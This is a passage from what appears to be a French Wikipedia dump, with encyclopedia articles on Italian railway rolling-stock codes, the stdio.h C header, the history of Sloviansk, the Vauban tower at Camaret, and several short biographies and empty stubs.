Sony et Ampex codéveloppent et commercialisent un magnétoscope professionnel en 1976. Il remplace dans l'industrie de la télé le Quadruplex.
D2.
C'est un système vidéo numérique officiellement introduit en 1988, alternative à moindre coût par rapport au système D1 de Sony. Comme D-1, les images D-2 sont non-compressées.
DCT &amp; DST.
Digital Component Technology (DCT) et Data Storage Technology (DST) sont les noms respectivement d'un magnétoscope et d'un appareil de stockage de données, créés par Ampex en 1992. Les deux sont similaires aux systèmes de magnétoscope D1 et D2 de Sony.

</doc>
<doc id="3215425" url="https://fr.wikipedia.org/wiki?curid=3215425" title="Azza Besbès">
Azza Besbès



</doc>
<doc id="3215427" url="https://fr.wikipedia.org/wiki?curid=3215427" title="Codification du matériel roulant des Ferrovie dello Stato">
Codification du matériel roulant des Ferrovie dello Stato

Depuis sa création le , à la suite de la nationalisation de tous les chemins de fer italiens, les FS - Ferrovie dello Stato ("chemins de fer italiens") - ont établi une norme stricte de codification des matériels roulants permettant ainsi d'identifier rapidement les locomotives, wagons et voitures de voyageurs en service sur leur réseau.
Codification générale.
Les motrices sont répartis sur trois niveaux :
À ces éléments s'ajoute la Série, qui réunit les exemplaires d'un même groupe et sous ensembles par constructeur, ou résultant de plusieurs séries, périodes de construction, avec des caractéristiques qui peuvent évoluer, etc. Cette codification qui remonte au , dérive des usages en vigueur dans quasiment tous les pays européens.
Exemple de la locomotive FS E.326 :
À la suite de ces caractères, figure le numéro d'ordre de construction. Il n'est pas obligatoire que ces numéros soient systématiquement progressifs, même si c'est très souvent le cas. Certains numéros d'ordre peuvent être regroupés par centaines en fonction du nombre de constructeurs sélectionnés pour la production de la série du modèle ou des différentes séries fabriquées.
Numéro du groupe.
Le numéro du groupe, dans le passé, donnait des indications sur les prestations et la structure du modèle. Cette corrélation est devenue trop difficile avec la multiplication des modèles après 1950.
Locomotives en triphasé.
Le choix du numéro de groupe découlait de l'indication de certaines prestations typiques du modèle.
Le premier chiffre indiquait le nombre d'essieux moteurs, le second pouvait être "3" ou "5" : 3 pour les motrices des trains de voyageurs et 5 pour les convois de marchandises. Le troisième était un numéro pour distinguer les modèles similaires mais de groupes différents. Par exemple, la E.333 était le produit dans le temps, de locomotives à 3 essieux pour des trains de voyageurs.
Locomotives électriques courant continu.
Ce type de matériel représente plus de 95 % du total employé par les FS depuis leur création.
Pour ces locomotives, le choix de la numérotation est légèrement différent. Le premier chiffre indique toujours le nombre d'essieux moteurs. L'ordre progressif, qui sert à reconnaitre l'unité des groupes disposant de la même structure, est attribué par le second chiffre qui, historiquement démarre par le "2" au lieu du "1". La raison de cette exception est étrange, et deux théories s'affrontent : 
Le troisième chiffre indiquait le nombre de moteurs installés.
Exemple avec les locomotives FS E.636, qui définit une locomotive électrique avec six essieux moteurs (premier chiffre), six moteurs de traction (troisième chiffre). Le chiffre central (3) indique qu'il s'agit du second groupe construit de cette série, le premier groupe était représenté par les locomotives FS E.626.
Dans certains cas particuliers, le chiffre correspondant au nombre de moteurs pouvait varier selon que la locomotive était spécifiquement construite et destinée aux convois de marchandises ou aux trains de voyageurs, le chiffre était alors toujours impair. Exemple avec les locomotives FS E.632/FS E.633 ou les locomotives FS E.646/FS E.645.
Cette numérotation ne peut plus être appliquée strictement de nos jours avec la multiplication des modèles, des séries et des types. Par exemple, les locomotives récentes FS E.412 sont équipées de quatre moteurs et non pas deux comme on pourrait simplement le croire. La codification générale reste encore valable pour les locomotives fonctionnant en courant continu mais n'est pas vérifiable pour celles qui sont conçues pour les lignes 25 kV avec moteurs asynchrones triphasé des groupes récents : FS E.402, FS E.404, FS E.405 ou FS E.412.
Les surnoms.
À partir de 1970, on commença à donner des surnoms officiels aux différents groupes ou à quelques unités particulières. Cette pratique sera très prisée des passionnés et des machinistes mais sera rapidement abandonnée. 
Les locomotives avec des surnoms officiels sont :
Les FS E.428.226 "Navetta" auraient dû être baptisées "Pirata", mais ce surnom ne sera jamais officialisé.
Locomotives.
À vapeur.
La première locomotive italienne à vapeur mise en service sur la ligne Naples-Portici, garda l'usage répandu dans tous les pays de porter le nom de son inventeur, de son constructeur ou un nom de fantaisie. Ce fut le cas avec "Vesuvio" du nom du volcan où elle devait effectuer son service. 
Au , l'habitude d'appeler les locomotives par le nom du constructeur trouva rapidement ses limites avec le nombre croissant de modèles construits par ce même constructeur. Il fallut rapidement ajouter l'année de fabrication. Ce n'est qu'au milieu du siècle que l'on compléta l'identification avec un numéro d'ordre.
Au début, les locomotives à vapeur comportaient un numéro à 5 chiffres, dont les trois premiers pour la référence du groupe et les deux autres le numéro d'ordre. Par exemple, la locomotive "68501" était l'exemplaire numéro 1 des locomotives Gruppo 685.
Après la création des FS-Ferrovie dello Stato en 1905, les locomotives subirent un changement de codification. La désignation à 5 chiffres sera remplacée le par une identification à six chiffres. L'ancienne "68501" est alors devenue FS 685.001.
Toutes les locomotives furent identifiées avec une inscription en blanc sur fond rouge à l'avant, et avec des caractères en bronze sur les flancs.
Locomotives Diesel et électriques.
Avec l'apparition des locomotives électriques, les FS décidèrent de codifier ces matériels d'une manière plus complète. 
À partir de 1919 les locomotives électriques ont toutes reçu un "E" comme identifiant et un "D" pour les diesel qui devait précéder ne numéro de la série séparé par un point. Un marquage correct pour la première locomotive électrique de la série FS E.464 est donc "E.464.001".
Pour les motrices diesel, il fallait distinguer la puissance installée ; sous les 200 CV (147 kW) elles sont appelées "automotrices", au-delà de 200 CV "locomotives".
L'usage courant.
On peut déplorer que dans l'usage courant actuel, notamment sur certains documents techniques, les appellations ne respectent pas toujours très strictement la codification imposée. Il n'est pas rare de voir écrit sur les cahiers des charges et autres notices techniques les références du matériel avec des variantes comme par exemple pour la "E.464.001" on pourrait lire :
Depuis le , Trenitalia, nouvelle dénomination commerciale des FS, a statué que seul ferait foi le numéro indiqué sur la plaque d'identification en bronze, sur les flancs des locomotives. Toutes les autres indications pouvant ne pas respecter strictement la norme établie pour des raisons quelconques.
Rames automotrices.
Les rames automotrices possèdent une identification propre.
C'est l'Italie qui, la première au monde, a inventé les rames automotrices baptisées "Littorina" dont Fiat Ferroviaria a été le précurseur et le principal constructeur dès 1929. 
La codification de ces rames est composée des lettres AL pour Automotrice Légère, écrites en majuscules, suivies d'une troisième lettre en minuscule qui dépend du type d'alimentation. On peut trouver :
Pour les véhicules remorqués sans moteur, les lettres AL sont remplacées par la seule lettre L.
Si la rame comporte un compartiment bagages bien identifié, la lettre D est ajoutée entre AL (ou L) et la lettre minuscule qui suit. De la même manière, la lettre U indique la présence d'un compartiment postal, la lettre T indique la présence d'une impériale et la lettre H un compartiment réfrigéré (chambre froide ou congélateur) pour le transport de denrées périssables.
Pour certaines lignes en concession ou privées à écartement réduit, les rames comportaient la lettre R devant leur identification.
À l'origine, la codification comprenait un premier groupe de deux ou trois chiffres qui indiquait le nombre de places assises. Si le premier chiffre était doublé, cela indiquait que la rame était conçue avec des commandes multiples, pour être accouplée avec d'autres éléments du même type et n'avoir qu'un seul poste de pilotage.
Le second numéro (3 chiffres, sauf pour les moteurs diesel où il y avait un code à quatre chiffres) identifiait le constructeur de la rame :
Le numéro d'ordre progressif complétait la référence.
Exemples :
Pour les rames FS ALn 668, le chiffre 3 de la série 3000, 3100 et 3300 ne fera plus référence au constructeur qui sera toujours Fiat Ferroviaria, concepteur et seul constructeur.
Rames électriques - Elettrotreni.
Les rames électriques pour les grandes vitesses sont référencées depuis 1930 par les lettres ETR, acronyme de Elettro Treno Rapido. Le premier train à grande vitesse italien, l'ETR 200 a été mis en service en 1936 alors que tous les trains en Europe roulaient encore à la vapeur.
Le numéro de groupe est composé de trois chiffres dont le premier est un numéro d'ordre progressif indiquant la génération du matériel, le second indique l'ordre progressif au sein de cette génération et le troisième, la version au sein de cette famille.
Par exemple, les Fiat Pendolino ETR 485 fait partie du , 4xx Pendolino, et à la troisième génération (dans ce cas reconnaissable par les chiffres compris entre 6 et 8), mais indique aussi une version modifiée (le chiffre 5 à la place du 0). Les ETR 485 sont des ETR 480 modifiés pour une utilisation tricourant.

</doc>
<doc id="3215428" url="https://fr.wikipedia.org/wiki?curid=3215428" title="De vulgari eloquentia">
De vulgari eloquentia

 ("De l'éloquence en langue commune", opposée au latin) est le titre d'un essai inachevé de Dante Alighieri rédigé en latin. Il a probablement été écrit entre 1303 et 1304.
Dans cet ouvrage, Dante divise les langues de l'Europe occidentale selon la façon de dire "oui" et il distingue :

</doc>
<doc id="3215429" url="https://fr.wikipedia.org/wiki?curid=3215429" title="Bécédi Brignan">
Bécédi Brignan



</doc>
<doc id="3215430" url="https://fr.wikipedia.org/wiki?curid=3215430" title="Olimpiisky Indoor Arena">
Olimpiisky Indoor Arena

La Olimpiisky Indoor Arena (en ) est une arena située à Moscou (Russie), construite à l'occasion des Jeux olympiques d'été de 1980.
L'édifice est si vaste que peuvent occuper son espace. Lorsque des événements sportifs d'intérieur (basket-ball, tennis) sont organisées, seulement 1/4 de la surface est utilisée. La capacité dans cette configuration peut varier entre 10 000 et 16 000 places.
L'arena est démolie en 2020 pour être reconstruite totalement.
Histoire.
Conçu par l’architecte Mikhaïl Possokhine, le "Olimpiisky" a été construit pour les Jeux olympiques d'été de 1980 durant lequel il a accueilli les tournois de basket-ball et de boxe.
Lors de son inauguration, il était le plus grand complexe au monde de ce type. Il est aujourd'hui la quatrième plus grande salle omnisports au monde et la seconde plus grande salle de spectacle d'Europe, derrière la Paris La Défense Arena de Nanterre (en France).
Description.
Partie du Olimpiisky Sports Complex, il constitue un ensemble architectural avec un autre bâtiment, construit en même temps, la piscine olympique.
Un trait distinctif du bâtiment est la possibilité de séparer la salle en deux parties autonomes. Durant les Jeux olympiques de Moscou, 17 000 spectateurs purent assister au tournoi de basket-ball sur le côté sud, tandis qu'au nord 18 000 personnes assistaient à la boxe (soit 35 000 personnes pour les 2 évènements).

</doc>
<doc id="3215431" url="https://fr.wikipedia.org/wiki?curid=3215431" title="Olimpiisky">
Olimpiisky



</doc>
<doc id="3215432" url="https://fr.wikipedia.org/wiki?curid=3215432" title="Kaho Miyasaka">
Kaho Miyasaka

 née un dans la préfecture de Chiba est une écrivaine de manga japonaise. 
Elle est surtout connue pour avoir écrit le manga "Kare first love".

</doc>
<doc id="3215433" url="https://fr.wikipedia.org/wiki?curid=3215433" title="Park Jin-man">
Park Jin-man

Park Jin-man (né le à Incheon, Corée du Sud) est un instructeur coréen de baseball qui joue avec les SK Wyverns d'Incheon dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or de baseball lors des Jeux asiatiques 2002 à Pusan et la médaille de bronze lors des Jeux asiatiques 2006 à Doha, la médaille de bronze de baseball lors des jeux olympiques 2000 à Sydney et la médaille d'or de baseball lors des jeux olympiques 2008 à Pékin.
Il a obtenu la à la Classique mondiale de baseball 2006.

</doc>
<doc id="3215438" url="https://fr.wikipedia.org/wiki?curid=3215438" title="Ahouabo-Bouapé">
Ahouabo-Bouapé

Bouapé est une localité située dans le Sud de la Côte d'Ivoire, et appartenant au département d'Adzopé, dans la Région de La Mé. La localité de Bouapé est un chef-lieu de commune. Le périmètre de la commune de Bouapé englobe dans ses limites les villages et les campements qui leur sont rattachés.

</doc>
<doc id="3215440" url="https://fr.wikipedia.org/wiki?curid=3215440" title="Goodwin Knight">
Goodwin Knight

Goodwin Knight, né à Provo (Utah) et mort le à Inglewood (Californie), est un homme politique américain. Membre du Parti républicain, il est le gouverneur de Californie, en fonction du au .
Biographie.
Jeunesse et études.
Knight naît à Provo, dans l'Utah, mais sa famille déménage à Los Angeles alors qu'il est enfant. Son père est un ingénieur des mines. Il suit cependant les traces de son grand-père maternel, juge à Provo. Goodwin Knight fait ses études secondaires à Los Angeles à la Manual Arts High School, où l'un de ses camarades de classe est le futur pilote James H. Doolittle. Après avoir servi dans la marine au cours de la Première Guerre mondiale, il est diplômé en droit à l'université Stanford.
Cour supérieure de Los Angeles.
Il devient juge à la cour supérieure de Los Angeles en 1935 et est réélu sans difficultés en 1936 et 1942. Dans cette charge, il a à statuer sur le mariage et le divorce de plusieurs starlettes hollywoodiennes.
Lieutenant-gouverneur de Californie.
Sa carrière politique débute en 1944 lorsqu'il est candidat à l'investiture républicaine au Sénat des États-Unis. S'il se retire rapidement au profit du lieutenant-gouverneur Frederick F. Houser, il est élu pour succéder à ce dernier en 1946 et réélu en 1950. Il devient gouverneur de Californie en 1953 lorsque Earl Warren renonce à sa charge à la suite de sa nomination comme juge en chef des États-Unis.
Gouverneur de Californie.
Comme gouverneur de Californie, après avoir été élu sans difficulté en 1954 avec plus de 56 % des voix pour un mandat complet, Knight bataille avec le sénateur et le vice-président Richard Nixon pour le contrôle du Parti républicain en Californie. Si dans un premier temps il fait alliance avec Knowland, les choses changent en 1956 après que ce dernier apporte son soutien à Nixon pour sa réélection comme vice-président.
En 1957, Knowland annonce qu'il entend être candidat à la primaire contre Knight. La menace est sérieuse : Knight est connu pour ses sympathies, bien que modérées, envers les organisations ouvrières au moment où son parti devient de plus en plus conservateur. Finalement, sur les conseils de Nixon et du président Dwight D. Eisenhower, il renonce à se représenter en faveur de Knowland et est candidat au Sénat des États-Unis face à , candidat du Parti démocrate. Tous deux sont battus, ce qui permet à Nixon de prendre le contrôle du Parti républicain en Californie, élément clé dans sa course à l'investiture présidentielle de 1960.
Fin de vie et décès.
Son dernier acte politique est de soutenir Nelson Rockefeller en 1964 lors de l'investiture républicaine à la présidentielle. Goodwin Knight meurt en 1970 à Inglewood. De nombreuses personnalités sont présentes à ses funérailles, notamment le gouverneur Ronald Reagan, le sénateur Barry Goldwater et le général Omar Bradley.

</doc>
<doc id="3215444" url="https://fr.wikipedia.org/wiki?curid=3215444" title="Ahsoka">
Ahsoka



</doc>
<doc id="3215445" url="https://fr.wikipedia.org/wiki?curid=3215445" title="Union du Maghreb">
Union du Maghreb



</doc>
<doc id="3215446" url="https://fr.wikipedia.org/wiki?curid=3215446" title="C. Rodríguez Fer">
C. Rodríguez Fer



</doc>
<doc id="3215447" url="https://fr.wikipedia.org/wiki?curid=3215447" title="Min-Jae Kim">
Min-Jae Kim



</doc>
<doc id="3215448" url="https://fr.wikipedia.org/wiki?curid=3215448" title="Grand-Yapo">
Grand-Yapo



</doc>
<doc id="3215449" url="https://fr.wikipedia.org/wiki?curid=3215449" title="Jin-Man Park">
Jin-Man Park



</doc>
<doc id="3215453" url="https://fr.wikipedia.org/wiki?curid=3215453" title="Keun-Woo Jeong">
Keun-Woo Jeong



</doc>
<doc id="3215455" url="https://fr.wikipedia.org/wiki?curid=3215455" title="Dong-Joo Kim">
Dong-Joo Kim



</doc>
<doc id="3215456" url="https://fr.wikipedia.org/wiki?curid=3215456" title="M'brou">
M'brou

M’brou est une localité située dans le Sud de la Côte d'Ivoire et appartenant au département d'Agboville, dans la Région de l'Agnéby. 
La localité de M’brou, aujourd'hui essentiellement résidentielle, fut un chef-lieu de commune jusqu'en mars 2012, date à laquelle elle est devenue l'une des 1126 communes du pays qui ont été abolies.
Située dans la sous-préfecture de Guessiguié, elle compte habitants en 2014.

</doc>
<doc id="3215458" url="https://fr.wikipedia.org/wiki?curid=3215458" title="Suk-Min Yoon">
Suk-Min Yoon



</doc>
<doc id="3215461" url="https://fr.wikipedia.org/wiki?curid=3215461" title="Stdio.h">
Stdio.h

codice_1, pour « Standard Input/Output Header » ou « En-tête Standard d'Entrée/Sortie », est l'en-tête de la bibliothèque standard du C déclarant les macros, les constantes et les définitions de fonctions utilisées dans les opérations d'entrée/sortie. Il descend du « portable I/O package » (ou « paquet d'entrée/sortie portable ») écrit par Michael Lesk dans les Laboratoires Bell au début des années 70. Pour des raisons de compatibilité avec le C, le C++ intègre un équivalent : codice_2.
Les fonctions déclarées dans codice_1 sont extrêmement populaires car, faisant partie de la bibliothèque standard du C, elles sont garanties de fonctionner sur n'importe quelle plate-forme supportant le langage C. Certaines applications dédiées à une plate-forme particulière peuvent cependant avoir des raisons d'utiliser les routines d'entrée/sortie de cette plate-forme, plutôt que celles fournies par cet en-tête.
Exemple d'utilisation.
Toutes les fonctions en C (et ses nombreux dérivés) sont déclarées dans des en-têtes. Ainsi, les programmeurs doivent inclure l'en-tête codice_1 dans leur code source pour pouvoir utiliser les fonctions déclarées dans celui-ci.
int main(void)
 int ch;
 while ((ch = getchar()) != '\n')
 putchar(ch);
 putchar('\n');
 return 0;
Le programme ci-dessus lit la totalité des données envoyées sur l'entrée standard et les renvoie sur la sortie standard, byte par byte, et ajoute un retour à la ligne à la fin de cette sortie.
Par ailleurs, on peut aussi mentionner la fonction printf, souvent utilisée pour faire le "" en C mais qui n'a pas été utilisée dans cet exemple.

</doc>
<doc id="3215466" url="https://fr.wikipedia.org/wiki?curid=3215466" title="Kwang-Hyun Kim">
Kwang-Hyun Kim



</doc>
<doc id="3215467" url="https://fr.wikipedia.org/wiki?curid=3215467" title="Sloviansk">
Sloviansk

Sloviansk (en ) ou Slaviansk (en ) est une ville de l'oblast de Donetsk, en Ukraine orientale, et appartenant au raïon de Kramatorsk. Sa population s'élevait à 54 000 habitants en 2024 .
Géographie.
Sloviansk est arrosée par la rivière Kazenny Torets, à l'est, et par son confluent, le Soukhyï Torets, au sud, et se trouve à au nord de Donetsk, à au sud-est de Kharkiv et à à l'est-sud-est de Kiev. Elle se trouve juste au nord de la ville de Kramatorsk. La commune urbaine de Bylbassivka fait partie de sa périphérie ouest.
Communauté territoriale.
Depuis la réforme administrative de 2020, la ville de Sloviansk est le siège d'une communauté territoriale regroupant les localités suivantes : Bylbassivka, Soukhanivka, Myrne et Torets.
Histoire.
La forteresse de Tor est construite à l'emplacement de la ville actuelle en 1676. L'exploitation du sel commence peu après dans les environs et donne lieu à un important commerce. La localité est renommée Sloviansk en 1784, une déformation de "Solevansk", littéralement . Aujourd'hui encore la production de sel de la ville est une des plus importantes d'Europe. Depuis le début du , la ville s'est spécialisée dans les industries chimiques. Sous l'Empire russe, Sloviansk faisait partie du gouvernement d'Iekaterinoslav. La ville est connue pour ses premiers établissements de soins par les bains de boue ouverts à la fin du .
Les bolchéviques s'emparent du pouvoir à Sloviansk le (vieux style). Elle est occupée par l'armée allemande, le . L'armée blanche de Denikine s'y installe de mai à . Le général de l'armée blanche Koutepov y arrive à l'automne. En , le pouvoir bolchévique s'installe dans la région. En 1922, deux établissements de repos et des datchas expropriées sont réunis pour fonder un établissement thermal de 750 places. L'industrialisation de la ville commence dans les années 1930.
La station thermale obtient le statut d'établissement à échelle de toute l'Union soviétique en 1934. Le théâtre dramatique russe est inauguré en 1938. La veille de la guerre voit la ville possédant une vingtaine d'entreprises industrielles de niveau de l'Union ou de niveau de la république, ainsi que huit sanatoriums. Quatre cliniques sont en service pour une population de plus de habitants, ainsi que cinq polycliniques, vingt-trois établissements scolaires, six écoles spécialisées, et des écoles professionnelles dans le domaine de la chimie, du chemin de fer, etc. Sloviansk dispose aussi de neuf cinémas et de vingt-trois bibliothèques.
La ville est prise par l'Allemagne nazie le . En décembre 1941, les Juifs de la ville sont assassinés dans la carrière de la ville lors d'exécutions de masse perpétrées par une unité des Einsatzgruppen. Vingt-cinq usines et fabriques sont détruites. Des commandos spéciaux SS incendient plus d'une vingtaine d'établissement scolaires et supérieurs, dont l'école technique, ainsi que la station électrique et font sauter deux ponts sur la rivière Torets. Le théâtre est incendié, lorsque l'armée allemande quitte la ville, ainsi que des cliniques et plus d'un millier de maisons. L'Armée rouge libère Sloviansk le .
Aux élections présidentielles de 2004, ses habitants se prononcent pour Viktor Ianoukovytch à 90,98 % et pour Viktor Iouchtchenko à 6,7 %.
Troubles du printemps-été 2014.
En mars-, la ville est en proie à des mouvements d'agitation menés par des milices se réclamant de la « république populaire de Donetsk ». Le siège de la ville par l'armée ukrainienne depuis le se révèle un échec et cause la mort de nombreux civils. La tension grandit également avec le stationnement depuis le , à quelques kilomètres de la ville, d'une colonne de blindés de l'armée ukrainienne, commandée par le général Valeri Kroutov. Ce dernier affirme à propos des agitateurs qu'il qualifie de : . Les troupes ukrainiennes encerclent la ville le avec une vingtaine de blindés et 500 hommes. Nelly Chtepa, la maire de la ville nommée par le gouvernement ukrainien et ne pouvant exercer son mandat faute de se trouver à Sloviansk, déclare dans une interview à Kiev le mardi au matin qu'il Ces propos suscitent l'indignation du maire auto-proclamé de Sloviansk, Viatcheslav Ponomarev. Le lendemain, une partie des blindés envoyés par le gouvernement ukrainien change de camp et se range du côté des partisans de la fédéralisation. La foule laisse les autres soldats retourner à leur base de Dnipropetrovsk. D'après les déclarations des soldats ukrainiens, aucun Il s'agit donc d'un échec de la part du gouvernement ukrainien. Le , sept observateurs qui n'étaient pas de l'OSCE (dont quatre Allemands, un Danois et un Suédois) et cinq militaires ukrainiens sont capturés par les insurgés pro-russes et détenus comme otages, sous l'autorité du maire auto-proclamé de la ville, Viatcheslav Ponomarev (lequel les qualifie d'), ce qui a soulevé une vague de protestation de la part des pays de l'Union européenne. Ils sont relâchés quelques jours plus tard. La ville, dont la défense est organisée par le colonel Strelkov, est encerclée de chars de l'armée ukrainienne. L'eau, l'électricité et le téléphone y sont largement coupés, la ville et ses faubourgs sont quotidiennement bombardés. Les Russes proposent en vain l'instauration d'un couloir humanitaire. Des colonnes de chars sont arrêtées à plusieurs reprises par la population (dont le ). Ponomarev est remplacé au poste de maire par Vladimir Pavlenko, le . Ce dernier, ayant déjà rencontré des membres de la mission de l'OSCE en Ukraine, se dit prêt à .
Après près de trois mois de siège, Sloviansk est reprise par l'armée loyaliste le .
En avril 2022, lors de l'invasion de l'Ukraine par la Russie, les troupes russes se retirent de Kiev et des régions du nord de l'Ukraine, et se repositionnent dans l'est du pays pour commencer la bataille de Sloviansk.
Population.
Recensements (*) ou estimations de la population :
Économie.
Les principales entreprises de Sloviansk sont :
La ville a sa gare ferroviaire.

</doc>
<doc id="3215468" url="https://fr.wikipedia.org/wiki?curid=3215468" title="Tour Vauban (Camaret-sur-Mer)">
Tour Vauban (Camaret-sur-Mer)

La tour Vauban, initialement nommée "tour de Camaret" ou "tour Dorée", est une tour polygonale défensive construite sur un plan directeur de Vauban et érigée sur le Sillon à Camaret-sur-Mer dont elle figure sur les armoiries. Elle constitue un des prototypes les mieux restaurés des forts à la mer à batterie basse et tour de gorge construits par Vauban, avec comme originalité l'enduit qui la recouvre, à base de brique pilée.
Historique.
Projetée dès 1683, la tour est tracée en 1689 par Vauban. La construction de l'édifice, supervisée par l'ingénieur Jean-Pierre Traverse, débute en 1693 pour s'achever en 1696. Elle protège essentiellement les accès à la batterie, qui défend le mouillage, dont l'importance stratégique est capitale pour la sécurité de la rade. La tour casematée fait partie d'un vaste dispositif de défense : la batterie basse doit être dotée de onze pièces d'artillerie croisant leurs feux avec ceux de la pointe du Grand Gouin, des lignes primitives de Quélern et des nombreuses batteries côtières. La garnison comprend alors un lieutenant, un sergent et cinq hommes appuyés par des miliciens composés d'habitants de Camaret.
Lors de la bataille de Camaret le , les Anglo-Hollandais tentent un débarquement sur la plage de Trez-Rouz. Commandées par Vauban, les troupes françaises repoussent les assaillants, l'opération est un échec. Lors de l'attaque, la tour, dont le commandement est confié à Alexandre de Boulainvilliers, capitaine de galiote et d'artillerie, est encore en travaux. La batterie, en cours d'achèvement tout comme les deux corps de garde, n'est alors armée que de 9 canons de 24 livres de balle (boulets d'environ 12 kg) et 3 mortiers de fer de 12 pouces. Cette victoire vaut à Camaret d'être exemptée de fouages jusqu'à la Révolution et d'hériter du titre de .
Jusque sous le Second Empire, la tour Vauban conserve une fonction militaire. Bien que modernisée pour faire face à l'évolution de l'armement, elle n'est plus adaptée. Les ingénieurs militaires choisissent de construire en 1861 une batterie extérieure plus basse, de six mètres d'épaisseur, sous la forme d'un épaulement en ligne brisée vers la chapelle Notre-Dame de Rocamadour. L'ancienne batterie et sa tour sont conservées comme réduit. La fortification est désaffectée à la fin du et acquise par la municipalité de Camaret en 1904.
La tour Vauban fait l’objet d’un classement au titre des monuments historiques depuis le .
Durant la Première Guerre mondiale, elle sert de réservoir d'eau potable, et une base d'hydravions occupe l'emplacement de la batterie extérieure démantelée. En 1944, le , l’aviation américaine mitraille la tour de balles incendiaires, détruisant le toit. Une première restauration intervient en 1956 pour réparer les dégâts causés par cet incendie (toiture, enduit).
Jusqu’en , la tour est gérée par le musée de la Marine qui y a installé un petit musée où sont conservés des objets et documents concernant l'histoire de la marine en général, et l'histoire de Camaret en particulier. En 1993, la gestion est confiée à des associations qui assurent l’accueil du public et y organisent des expositions de juin à septembre, en lien avec Vauban, la défense du goulet de Brest, la tour.
Camaret-sur-Mer est membre de l'association de villes réseau des sites majeurs de Vauban. Depuis le , un réseau de douze sites, dont la tour Vauban, est inscrit sur la liste du patrimoine mondial de l'UNESCO. Dans ce cadre, la tour fait l'objet de campagnes de restauration en raison du mauvais état général de l’édifice aggravé par le développement d’algues et lichens : réfection de l'enduit en 2007, restauration de l’escarpe et de la contrescarpe en 2009, restauration de la batterie, du four à boulet et du corps de garde à partir de 2011, restauration du pont-levis en 2014 et de l’intérieur de la tour en 2016. Enfin, la municipalité revoit l'offre touristique et scénographique en créant un centre d'interprétation de l'œuvre de Vauban en Bretagne qui vise à répondre au désintérêt manifesté par les visiteurs de la tour.
Architecture.
Construite à l'aide de matériaux extraits du port de Camaret (crépi rouge fait de sable de la grève, de chaux et de brique pilée rouge qui avec le temps a pris une couleur ocre), la tour hexagonale (plan carré à deux pans coupés flanquant la gorge) est haute de 18 mètres et comporte quatre niveaux (ou deux étage) percés de créneaux de mousqueterie, du type « archère ». Les deux premiers niveaux sont voûtés. C'est au second niveau que se trouvent l'entrée, à partir du terre-plein de la batterie, et le départ de l'escalier à vis, desservant les parties hautes et logé dans le saillant arrière. Le dernier niveau, planchéié et ceinturé d'un parapet percé de créneaux de mousqueterie, est couvert d'une toiture ardoisée à six pans.
La tour est flanquée de murailles, d'un corps de garde et d'une batterie basse semi-circulaire surmontée d'un parapet muni de onze embrasures d'artillerie et qui contenait 11 canons ainsi qu'un four à boulets (un des neuf exemplaires encore sur pied). On peut observer que les deux branches du front de gorge sont creuses et munies d'une galerie de fusillade, et celle de droite porte en crête une embrasure à canon, tirant à revers. L'édifice est baptisé dès l'origine « tour Dorée » en raison de l'enduit orangé qui en recouvre le parement et réchauffe le gris des chaînages de granit. L'ensemble est entouré d'un fossé à marée (qui se remplit avec la marée) et s'ouvre par un pont-levis.
Le four à boulets a été construit lors de la période révolutionnaire, remplaçant un des deux corps de garde. L'édifice a alors plusieurs fonctions : tour de guet, magasin à poudre, logement de garnison.

</doc>
<doc id="3215469" url="https://fr.wikipedia.org/wiki?curid=3215469" title="TBD">
TBD



</doc>
<doc id="3215471" url="https://fr.wikipedia.org/wiki?curid=3215471" title="Seung-Jun Song">
Seung-Jun Song



</doc>
<doc id="3215472" url="https://fr.wikipedia.org/wiki?curid=3215472" title="Tae-Hyon Chong">
Tae-Hyon Chong



</doc>
<doc id="3215475" url="https://fr.wikipedia.org/wiki?curid=3215475" title="Lee Seung-yeop">
Lee Seung-yeop

Lee Seung-yeop (né le à Daegu, Corée du Sud) est un ancien joueur sud-coréen de baseball. Il est surnommé le Roi Lion par les Coréens et Seung-Tzang (lit. Monsieur Seung-Yeop) par les Japonais. Il a joué au Japon de 2004 à 2011.
Il a obtenu la médaille d'or de baseball lors des Jeux asiatiques 2002 à Pusan, la médaille de bronze de baseball lors des jeux olympiques 2000 à Sydney et la médaille d'or de baseball lors des jeux olympiques 2008 à Pékin.
Il a obtenu la à la Classique mondiale de baseball 2006.

</doc>
<doc id="3215476" url="https://fr.wikipedia.org/wiki?curid=3215476" title="Martin Vassallo Arguello">
Martin Vassallo Arguello



</doc>
<doc id="3215479" url="https://fr.wikipedia.org/wiki?curid=3215479" title="Chasmas martiens">
Chasmas martiens



</doc>
<doc id="3215480" url="https://fr.wikipedia.org/wiki?curid=3215480" title="Shiri maimon">
Shiri maimon



</doc>
<doc id="3215481" url="https://fr.wikipedia.org/wiki?curid=3215481" title="Won-Sam Jang">
Won-Sam Jang



</doc>
<doc id="3215483" url="https://fr.wikipedia.org/wiki?curid=3215483" title="Monastère d'Akhtala">
Monastère d'Akhtala



</doc>
<doc id="3215484" url="https://fr.wikipedia.org/wiki?curid=3215484" title="Zoé Chauveau">
Zoé Chauveau

Zoé Chauveau (Dominique, Sabine, Zoé Chauveau) est une actrice française née le à Boulogne-Billancourt (Hauts-de-Seine, France).
Biographie.
Bébé, elle apparaît dans des publicités pour layettes. En 1965, pose, avec son frère cadet, César, aux côtés de la fille de Kennedy et de Neil Armstrong pour des photos publicitaires.
Marié avec Jean Francois Rock, elle a une fille, Charlotte et un fils Gabriel
Elle décide cependant d'arreter sa carriere pour se consacrer a sa vie de famille.

</doc>
<doc id="3215486" url="https://fr.wikipedia.org/wiki?curid=3215486" title="Bong Jung-keun">
Bong Jung-keun

Bong Jung-keun (né le à Séoul, Corée du Sud) est un joueur coréen de baseball qui joue avec les LG Twins dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or en baseball lors des Jeux olympiques 2008 à Pékin.
Il a joué deux matchs contre Taïwan et le Japon, a gagné tous les matchs du , et a gagné le match du contre le Japon dans la Classique mondiale de baseball 2009.

</doc>
<doc id="3215487" url="https://fr.wikipedia.org/wiki?curid=3215487" title="Monastère d’Akhtala">
Monastère d’Akhtala



</doc>
<doc id="3215488" url="https://fr.wikipedia.org/wiki?curid=3215488" title="Simon Munyutu">
Simon Munyutu

Simon Munyutu, né le à Nakuru (Kenya) est un athlète français spécialisé en cross-country et courses de fond, notamment le marathon.
Biographie.
Né au Kenya en 1977, il intègre le étranger de la Légion étrangère à Aubagne. Il est ensuite incorporé () au d'artillerie à Suippes (Marne), au sein duquel il porte le grade de caporal.
Il a été naturalisé français le . Il est licencié au club Clermont Athlétisme de Clermont-Ferrand, son entraîneur est Jean-François Pontier.
